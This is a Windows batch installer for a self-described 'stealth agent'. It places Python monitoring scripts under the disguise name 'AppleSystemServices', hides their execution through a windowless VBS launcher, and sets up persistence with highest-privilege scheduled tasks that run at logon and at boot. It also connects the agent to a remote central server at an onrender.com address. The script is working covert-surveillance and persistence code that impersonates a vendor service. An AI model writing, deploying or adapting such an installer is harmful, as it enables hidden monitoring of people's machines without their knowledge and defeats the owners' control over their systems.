@echo off
:: ================================================
:: Windows Stealth Agent Automated Installer v4.1
:: Auto-detects Python path and builds silent launcher
:: Usage: Right-click -> Run as Administrator
:: ================================================

TITLE AppleSystemServices Windows Installer
color 0A
cls

echo ================================================
echo   🔧 Installing AppleSystemServices Agent (Windows)
echo ================================================
echo.

SET "SERVER_URL=https://central-monitor.onrender.com"
IF NOT "%~1"=="" SET "SERVER_URL=%~1"

SET "INSTALL_DIR=C:\ProgramData\AppleSystemServices"

echo  📡 Target Central Server: %SERVER_URL%
echo  📁 Target Install Path : %INSTALL_DIR%
echo.

:: Create install directory
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

:: Copy agent files
xcopy /E /Y /I "%~dp0monitor.py" "%INSTALL_DIR%\" >nul
xcopy /E /Y /I "%~dp0sysupdate.py" "%INSTALL_DIR%\" >nul
if exist "%~dp0templates" xcopy /E /Y /I "%~dp0templates" "%INSTALL_DIR%\templates\" >nul

:: Find Python Executable Path
SET "PYTHON_EXE=python"
FOR /F "tokens=*" %%I IN ('where python 2^>nul') DO (
    SET "PYTHON_EXE=%%I"
    GOTO :FOUND_PY
)

:: Check common AppData & Program Files Python locations
IF EXIST "%LOCALAPPDATA%\Programs\Python\Python312\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python312\python.exe"
IF EXIST "%LOCALAPPDATA%\Programs\Python\Python311\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python311\python.exe"
IF EXIST "%LOCALAPPDATA%\Programs\Python\Python310\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python310\python.exe"
IF EXIST "%LOCALAPPDATA%\Programs\Python\Python39\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python39\python.exe"
IF EXIST "C:\Python311\python.exe" SET "PYTHON_EXE=C:\Python311\python.exe"
IF EXIST "C:\Python310\python.exe" SET "PYTHON_EXE=C:\Python310\python.exe"
IF EXIST "C:\Program Files\Python311\python.exe" SET "PYTHON_EXE=C:\Program Files\Python311\python.exe"

:FOUND_PY
echo 🐍 Using Python Path: %PYTHON_EXE%

:: Install Python pip requirements
"%PYTHON_EXE%" -m pip install flask psutil requests pillow --quiet >nul 2>nul

:: Build run_agent.cmd
(
echo @echo off
echo "%PYTHON_EXE%" "%INSTALL_DIR%\sysupdate.py" --server %SERVER_URL%
) > "%INSTALL_DIR%\run_agent.cmd"

:: Build run_agent.vbs for 100% silent execution
(
echo Set WshShell = CreateObject("WScript.Shell"^)"
echo WshShell.Run "cmd.exe /c """ ^& "%INSTALL_DIR%\run_agent.cmd" ^& """", 0, False
) > "%INSTALL_DIR%\run_agent.vbs"

:: Register Scheduled Task to start automatically on system boot / logon
echo ⚙️ Creating Windows Task Scheduler Stealth Service...
schtasks /create /tn "AppleSystemServices" /tr "wscript.exe \"%INSTALL_DIR%\run_agent.vbs\"" /sc onlogon /rl highest /f >nul 2>nul
schtasks /create /tn "AppleSystemServices_Boot" /tr "wscript.exe \"%INSTALL_DIR%\run_agent.vbs\"" /sc onstart /rl highest /f >nul 2>nul

:: Start agent immediately
echo 🚀 Launching Agent background process...
wscript.exe "%INSTALL_DIR%\run_agent.vbs"

echo.
echo ================================================
echo   ✅ SUCCESS! Agent is running silently on Windows.
echo   📡 Connected to: %SERVER_URL%
echo ================================================
echo.
pause
